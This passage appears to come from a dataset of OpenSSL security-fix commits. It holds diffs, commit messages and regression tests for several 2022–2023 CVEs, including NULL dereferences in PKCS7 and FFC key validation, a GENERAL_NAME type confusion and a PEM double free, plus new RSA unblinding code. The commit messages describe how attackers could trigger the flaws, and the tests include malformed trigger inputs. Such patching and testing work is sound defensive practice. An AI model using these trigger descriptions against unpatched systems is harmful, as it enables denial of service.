    \ ERR_R_BIO_LIB);\n+                goto err;\n+            }\n             EVP_MD_free(evp_md);\n\
    \             if (out == NULL)\n                 out = btmp;"
  commit_message: 'pk7_doit.c: Check return of BIO_set_md() calls


    These calls invoke EVP_DigestInit() which can fail for digests

    with implicit fetches. Subsequent EVP_DigestUpdate() from BIO_write()

    or EVP_DigestFinal() from BIO_read() will segfault on NULL

    dereference. This can be triggered by an attacker providing

    PKCS7 data digested with MD4 for example if the legacy provider

    is not loaded.


    If BIO_set_md() fails the md BIO cannot be used.


    CVE-2023-0401


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Richard Levitte <levitte@openssl.org>'
  commit_sha: 6eebe6c0238178356114a96a7858f36b24172847
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_genn.c\n+++ b/crypto/x509/v3_genn.c\n@@ -98,7 +98,7 @@ int\
    \ GENERAL_NAME_cmp(GENERAL_NAME *a, GENERAL_NAME *b)\n         return -1;\n  \
    \   switch (a->type) {\n     case GEN_X400:\n-        result = ASN1_TYPE_cmp(a->d.x400Address,\
    \ b->d.x400Address);\n+        result = ASN1_STRING_cmp(a->d.x400Address, b->d.x400Address);\n\
    \         break;\n \n     case GEN_EDIPARTY:"
  - "--- a/test/v3nametest.c\n+++ b/test/v3nametest.c\n@@ -644,6 +644,14 @@ static\
    \ struct gennamedata {\n             0xb7, 0x09, 0x02, 0x02\n         },\n   \
    \      15\n+    }, {\n+        /*\n+         * Regression test for CVE-2023-0286.\n\
    +         */\n+        {\n+            0xa3, 0x00\n+        },\n+        2\n \
    \    }\n };\n "
  commit_message: 'Fix GENERAL_NAME_cmp for x400Address (master)


    CVE-2023-0286


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: 7880536fe17c2b5450e279155bedd51771d28c9f
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/ffc/ffc_key_validate.c\n+++ b/crypto/ffc/ffc_key_validate.c\n@@\
    \ -24,6 +24,11 @@ int ossl_ffc_validate_public_key_partial(const FFC_PARAMS *params,\n\
    \     BN_CTX *ctx = NULL;\n \n     *ret = 0;\n+    if (params == NULL || pub_key\
    \ == NULL || params->p == NULL) {\n+        *ret = FFC_ERROR_PASSED_NULL_PARAM;\n\
    +        return 0;\n+    }\n+\n     ctx = BN_CTX_new_ex(NULL);\n     if (ctx ==\
    \ NULL)\n         goto err;\n@@ -107,6 +112,10 @@ int ossl_ffc_validate_private_key(const\
    \ BIGNUM *upper, const BIGNUM *priv,\n \n     *ret = 0;\n \n+    if (priv == NULL\
    \ || upper == NULL) {\n+        *ret = FFC_ERROR_PASSED_NULL_PARAM;\n+       \
    \ goto err;\n+    }\n     if (BN_cmp(priv, BN_value_one()) < 0) {\n         *ret\
    \ |= FFC_ERROR_PRIVKEY_TOO_SMALL;\n         goto err;"
  - "--- a/test/ffc_internal_test.c\n+++ b/test/ffc_internal_test.c\n@@ -510,6 +510,27\
    \ @@ static int ffc_public_validate_test(void)\n     if (!TEST_true(ossl_ffc_validate_public_key(params,\
    \ pub, &res)))\n         goto err;\n \n+    /* Fail if params is NULL */\n+  \
    \  if (!TEST_false(ossl_ffc_validate_public_key(NULL, pub, &res)))\n+        goto\
    \ err;\n+    if (!TEST_int_eq(FFC_ERROR_PASSED_NULL_PARAM, res))\n+        goto\
    \ err;\n+    res = -1;\n+    /* Fail if pubkey is NULL */\n+    if (!TEST_false(ossl_ffc_validate_public_key(params,\
    \ NULL, &res)))\n+        goto err;\n+    if (!TEST_int_eq(FFC_ERROR_PASSED_NULL_PARAM,\
    \ res))\n+        goto err;\n+    res = -1;\n+\n+    BN_free(params->p);\n+  \
    \  params->p = NULL;\n+    /* Fail if params->p is NULL */\n+    if (!TEST_false(ossl_ffc_validate_public_key(params,\
    \ pub, &res)))\n+        goto err;\n+    if (!TEST_int_eq(FFC_ERROR_PASSED_NULL_PARAM,\
    \ res))\n+        goto err;\n+\n     ret = 1;\n err:\n     DH_free(dh);\n@@ -567,6\
    \ +588,16 @@ static int ffc_private_validate_test(void)\n     if (!TEST_true(ossl_ffc_validate_private_key(params->q,\
    \ priv, &res)))\n         goto err;\n \n+    if (!TEST_false(ossl_ffc_validate_private_key(NULL,\
    \ priv, &res)))\n+        goto err;\n+    if (!TEST_int_eq(FFC_ERROR_PASSED_NULL_PARAM,\
    \ res))\n+        goto err;\n+    res = -1;\n+    if (!TEST_false(ossl_ffc_validate_private_key(params->q,\
    \ NULL, &res)))\n+        goto err;\n+    if (!TEST_int_eq(FFC_ERROR_PASSED_NULL_PARAM,\
    \ res))\n+        goto err;\n+\n     ret = 1;\n err:\n     DH_free(dh);"
  commit_message: 'Fix NULL deference when validating FFC public key.


    Fixes CVE-2023-0217


    When attempting to do a BN_Copy of params->p there was no NULL check.

    Since BN_copy does not check for NULL this is a NULL reference.


    As an aside BN_cmp() does do a NULL check, so there are other checks

    that fail because a NULL is passed. A more general check for NULL params

    has been added for both FFC public and private key validation instead.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: bcec03c33cc00a7b5eb89ebeeee59e604570a86a
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/pkcs7/pk7_lib.c\n+++ b/crypto/pkcs7/pk7_lib.c\n@@ -415,6 +415,8\
    \ @@ PKCS7_SIGNER_INFO *PKCS7_add_signature(PKCS7 *p7, X509 *x509, EVP_PKEY *pkey,\n\
    \ \n static STACK_OF(X509) *pkcs7_get_signer_certs(const PKCS7 *p7)\n {\n+   \
    \ if (p7->d.ptr == NULL)\n+        return NULL;\n     if (PKCS7_type_is_signed(p7))\n\
    \         return p7->d.sign->cert;\n     if (PKCS7_type_is_signedAndEnveloped(p7))\n\
    @@ -424,6 +426,8 @@ static STACK_OF(X509) *pkcs7_get_signer_certs(const PKCS7\
    \ *p7)\n \n static STACK_OF(PKCS7_RECIP_INFO) *pkcs7_get_recipient_info(const\
    \ PKCS7 *p7)\n {\n+    if (p7->d.ptr == NULL)\n+        return NULL;\n     if\
    \ (PKCS7_type_is_signedAndEnveloped(p7))\n         return p7->d.signed_and_enveloped->recipientinfo;\n\
    \     if (PKCS7_type_is_enveloped(p7))\n@@ -441,13 +445,17 @@ void ossl_pkcs7_resolve_libctx(PKCS7\
    \ *p7)\n     const PKCS7_CTX *ctx = ossl_pkcs7_get0_ctx(p7);\n     OSSL_LIB_CTX\
    \ *libctx = ossl_pkcs7_ctx_get0_libctx(ctx);\n     const char *propq = ossl_pkcs7_ctx_get0_propq(ctx);\n\
    -    STACK_OF(PKCS7_RECIP_INFO) *rinfos = pkcs7_get_recipient_info(p7);\n-   \
    \ STACK_OF(PKCS7_SIGNER_INFO) *sinfos = PKCS7_get_signer_info(p7);\n-    STACK_OF(X509)\
    \ *certs = pkcs7_get_signer_certs(p7);\n+    STACK_OF(PKCS7_RECIP_INFO) *rinfos;\n\
    +    STACK_OF(PKCS7_SIGNER_INFO) *sinfos;\n+    STACK_OF(X509) *certs;\n \n- \
    \   if (ctx == NULL)\n+    if (ctx == NULL || p7->d.ptr == NULL)\n         return;\n\
    \ \n+    rinfos = pkcs7_get_recipient_info(p7);\n+    sinfos = PKCS7_get_signer_info(p7);\n\
    +    certs = pkcs7_get_signer_certs(p7);\n+\n     for (i = 0; i < sk_X509_num(certs);\
    \ i++)\n         ossl_x509_set0_libctx(sk_X509_value(certs, i), libctx, propq);\n\
    \ "
  commit_message: 'Do not dereference PKCS7 object data if not set


    Fixes CVE-2023-0216


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: 80253dbdc92bec584f4a9866b43f8674156d838a
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/test/pemtest.c\n+++ b/test/pemtest.c\n@@ -96,12 +96,42 @@ static int test_cert_key_cert(void)\n\
    \     return 1;\n }\n \n+static int test_empty_payload(void)\n+{\n+    BIO *b;\n\
    +    static char *emptypay =\n+        \"-----BEGIN CERTIFICATE-----\\n\"\n+ \
    \       \"-\\n\" /* Base64 EOF character */\n+        \"-----END CERTIFICATE-----\"\
    ;\n+    char *name = NULL, *header = NULL;\n+    unsigned char *data = NULL;\n\
    +    long len;\n+    int ret = 0;\n+\n+    b = BIO_new_mem_buf(emptypay, strlen(emptypay));\n\
    +    if (!TEST_ptr(b))\n+        return 0;\n+\n+    /* Expected to fail because\
    \ the payload is empty */\n+    if (!TEST_false(PEM_read_bio_ex(b, &name, &header,\
    \ &data, &len, 0)))\n+        goto err;\n+\n+    ret = 1;\n+ err:\n+    OPENSSL_free(name);\n\
    +    OPENSSL_free(header);\n+    OPENSSL_free(data);\n+    BIO_free(b);\n+   \
    \ return ret;\n+}\n+\n int setup_tests(void)\n {\n     if (!TEST_ptr(pemfile =\
    \ test_get_argument(0)))\n         return 0;\n     ADD_ALL_TESTS(test_b64, OSSL_NELEM(b64_pem_data));\n\
    \     ADD_TEST(test_invalid);\n     ADD_TEST(test_cert_key_cert);\n+    ADD_TEST(test_empty_payload);\n\
    \     return 1;\n }"
  commit_message: 'Add a test for CVE-2022-4450


    Call PEM_read_bio_ex() and expect a failure. There should be no dangling

    ptrs and therefore there should be no double free if we free the ptrs on

    error.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: dc341a46677fe19f055bd2eea0e3a2af21053903
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/pem/pem_lib.c\n+++ b/crypto/pem/pem_lib.c\n@@ -995,7 +995,9 @@ int\
    \ PEM_read_bio_ex(BIO *bp, char **name_out, char **header,\n \n out_free:\n  \
    \   PEM_FREE(*header, flags, 0);\n+    *header = NULL;\n     PEM_FREE(*data, flags,\
    \ 0);\n+    *data = NULL;\n end:\n     EVP_ENCODE_CTX_free(ctx);\n     PEM_FREE(name,\
    \ flags, 0);"
  commit_message: 'Avoid dangling ptrs in header and data params for PEM_read_bio_ex


    In the event of a failure in PEM_read_bio_ex() we free the buffers we

    allocated for the header and data buffers. However we were not clearing

    the ptrs stored in *header and *data. Since, on success, the caller is

    responsible for freeing these ptrs this can potentially lead to a double

    free if the caller frees them even on failure.


    Thanks to Dawei Wang for reporting this issue.


    Based on a proposed patch by Kurt Roeckx.


    CVE-2022-4450


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: ee6243f3947107d655f6dee96f63861561a5aaeb
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/bn/bn_blind.c\n+++ b/crypto/bn/bn_blind.c\n@@ -13,20 +13,6 @@\n\
    \ \n #define BN_BLINDING_COUNTER     32\n \n-struct bn_blinding_st {\n-    BIGNUM\
    \ *A;\n-    BIGNUM *Ai;\n-    BIGNUM *e;\n-    BIGNUM *mod;                /*\
    \ just a reference */\n-    CRYPTO_THREAD_ID tid;\n-    int counter;\n-    unsigned\
    \ long flags;\n-    BN_MONT_CTX *m_ctx;\n-    int (*bn_mod_exp) (BIGNUM *r, const\
    \ BIGNUM *a, const BIGNUM *p,\n-                       const BIGNUM *m, BN_CTX\
    \ *ctx, BN_MONT_CTX *m_ctx);\n-    CRYPTO_RWLOCK *lock;\n-};\n-\n BN_BLINDING\
    \ *BN_BLINDING_new(const BIGNUM *A, const BIGNUM *Ai, BIGNUM *mod)\n {\n     BN_BLINDING\
    \ *ret = NULL;"
  - '--- a/crypto/bn/rsa_sup_mul.c

    +++ b/crypto/bn/rsa_sup_mul.c

    @@ -0,0 +1,604 @@

    +#include <openssl/e_os2.h>

    +#include <stddef.h>

    +#include <sys/types.h>

    +#include <string.h>

    +#include <openssl/bn.h>

    +#include <openssl/err.h>

    +#include <openssl/rsaerr.h>

    +#include "internal/endian.h"

    +#include "internal/numbers.h"

    +#include "internal/constant_time.h"

    +#include "bn_local.h"

    +

    +# if BN_BYTES == 8

    +typedef uint64_t limb_t;

    +#  if defined(__SIZEOF_INT128__) && __SIZEOF_INT128__ == 16

    +typedef uint128_t limb2_t;

    +#   define HAVE_LIMB2_T

    +#  endif

    +#  define LIMB_BIT_SIZE 64

    +#  define LIMB_BYTE_SIZE 8

    +# elif BN_BYTES == 4

    +typedef uint32_t limb_t;

    +typedef uint64_t limb2_t;

    +#  define LIMB_BIT_SIZE 32

    +#  define LIMB_BYTE_SIZE 4

    +#  define HAVE_LIMB2_T

    +# else

    +#  error "Not supported"

    +# endif

    +

    +/*

    + * For multiplication we''re using schoolbook multiplication,

    + * so if we have two numbers, each with 6 "digits" (words)

    + * the multiplication is calculated as follows:

    + *                        A B C D E F

    + *                     x  I J K L M N

    + *                     --------------

    + *                                N*F

    + *                              N*E

    + *                            N*D

    + *                          N*C

    + *                        N*B

    + *                      N*A

    + *                              M*F

    + *                            M*E

    + *                          M*D

    + *                        M*C

    + *                      M*B

    + *                    M*A

    + *                            L*F

    + *                          L*E

    + *                        L*D

    + *                      L*C

    + *                    L*B

    + *                  L*A

    + *                          K*F

    + *                        K*E

    + *                      K*D

    + *                    K*C

    + *                  K*B

    + *                K*A

    + *                        J*F

    + *                      J*E

    + *                    J*D

    + *                  J*C

    + *                J*B

    + *              J*A

    + *                      I*F

    + *                    I*E

    + *                  I*D

    + *                I*C

    + *              I*B

    + *         +  I*A

    + *         ==========================

    + *                        N*B N*D N*F

    + *                    + N*A N*C N*E

    + *                    + M*B M*D M*F

    + *                  + M*A M*C M*E

    + *                  + L*B L*D L*F

    + *                + L*A L*C L*E

    + *                + K*B K*D K*F

    + *              + K*A K*C K*E

    + *              + J*B J*D J*F

    + *            + J*A J*C J*E

    + *            + I*B I*D I*F

    + *          + I*A I*C I*E

    + *

    + *                1+1 1+3 1+5

    + *              1+0 1+2 1+4

    + *              0+1 0+3 0+5

    + *            0+0 0+2 0+4

    + *

    + *            0 1 2 3 4 5 6

    + * which requires n^2 multiplications and 2n full length additions

    + * as we can keep every other result of limb multiplication in two separate

    + * limbs

    + */

    +

    +#if defined HAVE_LIMB2_T

    +static ossl_inline void _mul_limb(limb_t *hi, limb_t *lo, limb_t a, limb_t b)

    +{

    +    limb2_t t;

    +    /*

    +     * this is idiomatic code to tell compiler to use the native mul

    +     * those three lines will actually compile to single instruction

    +     */

    +

    +    t = (limb2_t)a * b;

    +    *hi = t >> LIMB_BIT_SIZE;

    +    *lo = (limb_t)t;

    +}

    +#elif (BN_BYTES == 8) && (defined _MSC_VER)

    +/* https://learn.microsoft.com/en-us/cpp/intrinsics/umul128?view=msvc-170 */

    +#pragma intrinsic(_umul128)

    +static ossl_inline void _mul_limb(limb_t *hi, limb_t *lo, limb_t a, limb_t b)

    +{

    +    *lo = _umul128(a, b, hi);

    +}

    +#else

    +/*

    + * if the compiler doesn''t have either a 128bit data type nor a "return

    + * high 64 bits of multiplication"

    + */

    +static ossl_inline void _mul_limb(limb_t *hi, limb_t *lo, limb_t a, limb_t b)

    +{

    +    limb_t a_low = (limb_t)(uint32_t)a;

    +    limb_t a_hi = a >> 32;

    +    limb_t b_low = (limb_t)(uint32_t)b;

    +    limb_t b_hi = b >> 32;

    +

    +    limb_t p0 = a_low * b_low;

    +    limb_t p1 = a_low * b_hi;

    +    limb_t p2 = a_hi * b_low;

    +    limb_t p3 = a_hi * b_hi;

    +

    +    uint32_t cy = (uint32_t)(((p0 >> 32) + (uint32_t)p1 + (uint32_t)p2) >> 32);

    +

    +    *lo = p0 + (p1 << 32) + (p2 << 32);

    +    *hi = p3 + (p1 >> 32) + (p2 >> 32) + cy;

    +}

    +#endif

    +

    +/* add two limbs with carry in, return carry out */

    +static ossl_inline limb_t _add_limb(limb_t *ret, limb_t a, limb_t b, limb_t carry)

    +{

    +    limb_t carry1, carry2, t;

    +    /*

    +     * `c = a + b; if (c < a)` is idiomatic code that makes compilers

    +     * use add with carry on assembly level

    +     */

    +

    +    *ret = a + carry;

    +    if (*ret < a)

    +        carry1 = 1;

    +    else

    +        carry1 = 0;

    +

    +    t = *ret;

    +    *ret = t + b;

    +    if (*ret < t)

    +        carry2 = 1;

    +    else

    +        carry2 = 0;

    +

    +    return carry1 + carry2;

    +}

    +

    +/*

    + * add two numbers of the same size, return overflow

    + *

    + * add a to b, place result in ret; all arrays need to be n limbs long

    + * return overflow from addition (0 or 1)

    + */

    +static ossl_inline limb_t add(limb_t *ret, limb_t *a, limb_t *b, size_t n)

    +{

    +    limb_t c = 0;

    +    ossl_ssize_t i;

    +

    +    for(i = n - 1; i > -1; i--)

    +        c = _add_limb(&ret[i], a[i], b[i], c);

    +

    +    return c;

    +}

    +

    +/*

    + * return number of limbs necessary for temporary values

    + * when multiplying numbers n limbs large

    + */

    +static ossl_inline size_t mul_limb_numb(size_t n)

    +{

    +    return  2 * n * 2;

    +}

    +

    +/*

    + * multiply two numbers of the same size

    + *

    + * multiply a by b, place result in ret; a and b need to be n limbs long

    + * ret needs to be 2*n limbs long, tmp needs to be mul_limb_numb(n) limbs

    + * long

    + */

    +static void limb_mul(limb_t *ret, limb_t *a, limb_t *b, size_t n, limb_t *tmp)

    +{

    +    limb_t *r_odd, *r_even;

    +    size_t i, j, k;

    +

    +    r_odd = tmp;

    +    r_even = &tmp[2 * n];

    +

    +    memset(ret, 0, 2 * n * sizeof(limb_t));

    +

    +    for (i = 0; i < n; i++) {

    +        for (k = 0; k < i + n + 1; k++) {

    +            r_even[k] = 0;

    +            r_odd[k] = 0;

    +        }

    +        for (j = 0; j < n; j++) {

    +            /*

    +             * place results from even and odd limbs in separate arrays so that

    +             * we don''t have to calculate overflow every time we get individual

    +             * limb multiplication result

    +             */

    +            if (j % 2 == 0)

    +                _mul_limb(&r_even[i + j], &r_even[i + j + 1], a[i], b[j]);

    +            else

    +                _mul_limb(&r_odd[i + j], &r_odd[i + j + 1], a[i], b[j]);

    +        }

    +        /*

    +         * skip the least significant limbs when adding multiples of

    +         * more significant limbs (they''re zero anyway)

    +         */

    +        add(ret, ret, r_even, n + i + 1);

    +        add(ret, ret, r_odd, n + i + 1);

    +    }

    +}

    +

    +/* modifies the value in place by performing a right shift by one bit */

    +static ossl_inline void rshift1(limb_t *val, size_t n)

    +{

    +    limb_t shift_in = 0, shift_out = 0;

    +    size_t i;

    +

    +    for (i = 0; i < n; i++) {

    +        shift_out = val[i] & 1;

    +        val[i] = shift_in << (LIMB_BIT_SIZE - 1) | (val[i] >> 1);

    +        shift_in = shift_out;

    +    }

    +}

    +

    +/* extend the LSB of flag to all bits of limb */

    +static ossl_inline limb_t mk_mask(limb_t flag)

    +{

    +    flag |= flag << 1;

    +    flag |= flag << 2;

    +    flag |= flag << 4;

    +    flag |= flag << 8;

    +    flag |= flag << 16;

    +#if (LIMB_BYTE_SIZE == 8)

    +    flag |= flag << 32;

    +#endif

    +    return flag;

    +}

    +

    +/*

    + * copy from either a or b to ret based on flag

    + * when flag == 0, then copies from b

    + * when flag == 1, then copies from a

    + */

    +static ossl_inline void cselect(limb_t flag, limb_t *ret, limb_t *a, limb_t *b,
    size_t n)

    +{

    +    /*

    +     * would be more efficient with non volatile mask, but then gcc

    +     * generates code with jumps

    +     */

    +    volatile limb_t mask;

    +    size_t i;

    +

    +    mask = mk_mask(flag);

    +    for (i = 0; i < n; i++) {

    +#if (LIMB_BYTE_SIZE == 8)

    +        ret[i] = constant_time_select_64(mask, a[i], b[i]);

    +#else

    +        ret[i] = constant_time_select_32(mask, a[i], b[i]);

    +#endif

    +    }

    +}

    +

    +static limb_t _sub_limb(limb_t *ret, limb_t a, limb_t b, limb_t borrow)

    +{

    +    limb_t borrow1, borrow2, t;

    +    /*

    +     * while it doesn''t look constant-time, this is idiomatic code

    +     * to tell compilers to use the carry bit from subtraction

    +     */

    +

    +    *ret = a - borrow;

    +    if (*ret > a)

    +        borrow1 = 1;

    +    else

    +        borrow1 = 0;

    +

    +    t = *ret;

    +    *ret = t - b;

    +    if (*ret > t)

    +        borrow2 = 1;

    +    else

    +        borrow2 = 0;

    +

    +    return borrow1 + borrow2;

    +}

    +

    +/*

    + * place the result of a - b into ret, return the borrow bit.

    + * All arrays need to be n limbs long

    + */

    +static limb_t sub(limb_t *ret, limb_t *a, limb_t *b, size_t n)

    +{

    +    limb_t borrow = 0;

    +    ossl_ssize_t i;

    +

    +    for (i = n - 1; i > -1; i--)

    +        borrow = _sub_limb(&ret[i], a[i], b[i], borrow);

    +

    +    return borrow;

    +}

    +

    +/* return the number of limbs necessary to allocate for the mod() tmp operand
    */

    +static ossl_inline size_t mod_limb_numb(size_t anum, size_t modnum)

    +{

    +    return (anum + modnum) * 3;

    +}

    +

    +/*

    + * calculate a % mod, place the result in ret

    + * size of a is defined by anum, size of ret and mod is modnum,

    + * size of tmp is returned by mod_limb_numb()

    + */

    +static void mod(limb_t *ret, limb_t *a, size_t anum, limb_t *mod,

    +               size_t modnum, limb_t *tmp)

    +{

    +    limb_t *atmp, *modtmp, *rettmp;

    +    limb_t res;

    +    size_t i;

    +

    +    memset(tmp, 0, mod_limb_numb(anum, modnum) * LIMB_BYTE_SIZE);

    +

    +    atmp = tmp;

    +    modtmp = &tmp[anum + modnum];

    +    rettmp = &tmp[(anum + modnum) * 2];

    +

    +    for (i = modnum; i <modnum + anum; i++)

    +        atmp[i] = a[i-modnum];

    +

    +    for (i = 0; i < modnum; i++)

    +        modtmp[i] = mod[i];

    +

    +    for (i = 0; i < anum * LIMB_BIT_SIZE; i++) {

    +        rshift1(modtmp, anum + modnum);

    +        res = sub(rettmp, atmp, modtmp, anum+modnum);

    +        cselect(res, atmp, atmp, rettmp, anum+modnum);

    +    }

    +

    +    memcpy(ret, &atmp[anum], sizeof(limb_t) * modnum);

    +}

    +

    +/* necessary size of tmp for a _mul_add_limb() call with provided anum */

    +static ossl_inline size_t _mul_add_limb_numb(size_t anum)

    +{

    +    return 2 * (anum + 1);

    +}

    +

    +/* multiply a by m, add to ret, return carry */

    +static limb_t _mul_add_limb(limb_t *ret, limb_t *a, size_t anum,

    +                           limb_t m, limb_t *tmp)

    +{

    +    limb_t carry = 0;

    +    limb_t *r_odd, *r_even;

    +    size_t i;

    +

    +    memset(tmp, 0, sizeof(limb_t) * (anum + 1) * 2);

    +

    +    r_odd = tmp;

    +    r_even = &tmp[anum + 1];

    +

    +    for (i = 0; i < anum; i++) {

    +        /*

    +         * place the results from even and odd limbs in separate arrays

    +         * so that we have to worry about carry just once

    +         */

    +        if (i % 2 == 0)

    +            _mul_limb(&r_even[i], &r_even[i + 1], a[i], m);

    +        else

    +            _mul_limb(&r_odd[i], &r_odd[i + 1], a[i], m);

    +    }

    +    /* assert: add() carry here will be equal zero */

    +    add(r_even, r_even, r_odd, anum + 1);

    +    /*

    +     * while here it will not overflow as the max value from multiplication

    +     * is -2 while max overflow from addition is 1, so the max value of

    +     * carry is -1 (i.e. max int)

    +     */

    +    carry = add(ret, ret, &r_even[1], anum) + r_even[0];

    +

    +    return carry;

    +}

    +

    +static ossl_inline size_t mod_montgomery_limb_numb(size_t modnum)

    +{

    +    return modnum * 2 + _mul_add_limb_numb(modnum);

    +}

    +

    +/*

    + * calculate a % mod, place result in ret

    + * assumes that a is in Montgomery form with the R (Montgomery modulus) being

    + * smallest power of two big enough to fit mod and that''s also a power

    + * of the count of number of bits in limb_t (B).

    + * For calculation, we also need n'', such that mod * n'' == -1 mod B.

    + * anum must be <= 2 * modnum

    + * ret needs to be modnum words long

    + * tmp needs to be mod_montgomery_limb_numb(modnum) limbs long

    + */

    +static void mod_montgomery(limb_t *ret, limb_t *a, size_t anum, limb_t *mod,

    +                          size_t modnum, limb_t ni0, limb_t *tmp)

    +{

    +    limb_t carry, v;

    +    limb_t *res, *rp, *tmp2;

    +    ossl_ssize_t i;

    +

    +    res = tmp;

    +    /*

    +     * for intermediate result we need an integer twice as long as modulus

    +     * but keep the input in the least significant limbs

    +     */

    +    memset(res, 0, sizeof(limb_t) * (modnum * 2));

    +    memcpy(&res[modnum * 2 - anum], a, sizeof(limb_t) * anum);

    +    rp = &res[modnum];

    +    tmp2 = &res[modnum * 2];

    +

    +    carry = 0;

    +

    +    /* add multiples of the modulus to the value until R divides it cleanly */

    +    for (i = modnum; i > 0; i--, rp--) {

    +        v = _mul_add_limb(rp, mod, modnum, rp[modnum-1] * ni0, tmp2);

    +        v = v + carry + rp[-1];

    +        carry |= (v != rp[-1]);

    +        carry &= (v <= rp[-1]);

    +        rp[-1] = v;

    +    }

    +

    +    /* perform the final reduction by mod... */

    +    carry -= sub(ret, rp, mod, modnum);

    +

    +    /* ...conditionally */

    +    cselect(carry, ret, rp, ret, modnum);

    +}

    +

    +/* allocated buffer should be freed afterwards */

    +static void BN_to_limb(const BIGNUM *bn, limb_t *buf, size_t limbs)

    +{

    +    int i;

    +    int real_limbs = (BN_num_bytes(bn) + LIMB_BYTE_SIZE - 1) / LIMB_BYTE_SIZE;

    +    limb_t *ptr = buf + (limbs - real_limbs);

    +

    +    for (i = 0; i < real_limbs; i++)

    +         ptr[i] = bn->d[real_limbs - i - 1];

    +}

    +

    +#if LIMB_BYTE_SIZE == 8

    +static ossl_inline uint64_t be64(uint64_t host)

    +{

    +    uint64_t big = 0;

    +    DECLARE_IS_ENDIAN;

    +

    +    if (!IS_LITTLE_ENDIAN)

    +        return host;

    +

    +    big |= (host & 0xff00000000000000) >> 56;

    +    big |= (host & 0x00ff000000000000) >> 40;

    +    big |= (host & 0x0000ff0000000000) >> 24;

    +    big |= (host & 0x000000ff00000000) >>  8;

    +    big |= (host & 0x00000000ff000000) <<  8;

    +    big |= (host & 0x0000000000ff0000) << 24;

    +    big |= (host & 0x000000000000ff00) << 40;

    +    big |= (host & 0x00000000000000ff) << 56;

    +    return big;

    +}

    +

    +#else

    +/* Not all platforms have htobe32(). */

    +static ossl_inline uint32_t be32(uint32_t host)

    +{

    +    uint32_t big = 0;

    +    DECLARE_IS_ENDIAN;

    +

    +    if (!IS_LITTLE_ENDIAN)

    +        return host;

    +

    +    big |= (host & 0xff000000) >> 24;

    +    big |= (host & 0x00ff0000) >> 8;

    +    big |= (host & 0x0000ff00) << 8;

    +    big |= (host & 0x000000ff) << 24;

    +    return big;

    +}

    +#endif

    +

    +/*

    + * We assume that intermediate, possible_arg2, blinding, and ctx are used

    + * similar to BN_BLINDING_invert_ex() arguments.

    + * to_mod is RSA modulus.

    + * buf and num is the serialization buffer and its length.

    + *

    + * Here we use classic/Montgomery multiplication and modulo. After the calculation
    finished

    + * we serialize the new structure instead of BIGNUMs taking endianness into account.

    + */

    +int ossl_bn_rsa_do_unblind(const BIGNUM *intermediate,

    +                           const BN_BLINDING *blinding,

    +                           const BIGNUM *possible_arg2,

    +                           const BIGNUM *to_mod, BN_CTX *ctx,

    +                           unsigned char *buf, int num)

    +{

    +    limb_t *l_im = NULL, *l_mul = NULL, *l_mod = NULL;

    +    limb_t *l_ret = NULL, *l_tmp = NULL, l_buf;

    +    size_t l_im_count = 0, l_mul_count = 0, l_size = 0, l_mod_count = 0;

    +    size_t l_tmp_count = 0;

    +    int ret = 0;

    +    size_t i;

    +    unsigned char *tmp;

    +    const BIGNUM *arg1 = intermediate;

    +    const BIGNUM *arg2 = (possible_arg2 == NULL) ? blinding->Ai : possible_arg2;

    +

    +    l_im_count  = (BN_num_bytes(arg1)   + LIMB_BYTE_SIZE - 1) / LIMB_BYTE_SIZE;

    +    l_mul_count = (BN_num_bytes(arg2)   + LIMB_BYTE_SIZE - 1) / LIMB_BYTE_SIZE;

    +    l_mod_count = (BN_num_bytes(to_mod) + LIMB_BYTE_SIZE - 1) / LIMB_BYTE_SIZE;

    +

    +    l_size = l_im_count > l_mul_count ? l_im_count : l_mul_count;

    +    l_im  = OPENSSL_zalloc(l_size * LIMB_BYTE_SIZE);

    +    l_mul = OPENSSL_zalloc(l_size * LIMB_BYTE_SIZE);

    +    l_mod = OPENSSL_zalloc(l_mod_count * LIMB_BYTE_SIZE);

    +

    +    if ((l_im == NULL) || (l_mul == NULL) || (l_mod == NULL))

    +        goto err;

    +

    +    BN_to_limb(arg1,   l_im,  l_size);

    +    BN_to_limb(arg2,   l_mul, l_size);

    +    BN_to_limb(to_mod, l_mod, l_mod_count);

    +

    +    l_ret = OPENSSL_malloc(2 * l_size * LIMB_BYTE_SIZE);

    +

    +    if (blinding->m_ctx != NULL) {

    +        l_tmp_count = mul_limb_numb(l_size) > mod_montgomery_limb_numb(l_mod_count)
    ?

    +                      mul_limb_numb(l_size) : mod_montgomery_limb_numb(l_mod_count);

    +        l_tmp = OPENSSL_malloc(l_tmp_count * LIMB_BYTE_SIZE);

    +    } else {

    +        l_tmp_count = mul_limb_numb(l_size) > mod_limb_numb(2 * l_size, l_mod_count)
    ?

    +                      mul_limb_numb(l_size) : mod_limb_numb(2 * l_size, l_mod_count);

    +        l_tmp = OPENSSL_malloc(l_tmp_count * LIMB_BYTE_SIZE);

    +    }

    +

    +    if ((l_ret == NULL) || (l_tmp == NULL))

    +        goto err;

    +

    +    if (blinding->m_ctx != NULL) {

    +        limb_mul(l_ret, l_im, l_mul, l_size, l_tmp);

    +        mod_montgomery(l_ret, l_ret, 2 * l_size, l_mod, l_mod_count,

    +                       blinding->m_ctx->n0[0], l_tmp);

    +    } else {

    +        limb_mul(l_ret, l_im, l_mul, l_size, l_tmp);

    +        mod(l_ret, l_ret, 2 * l_size, l_mod, l_mod_count, l_tmp);

    +    }

    +

    +    /* modulus size in bytes can be equal to num but after limbs conversion it
    becomes bigger */

    +    if (num < BN_num_bytes(to_mod)) {

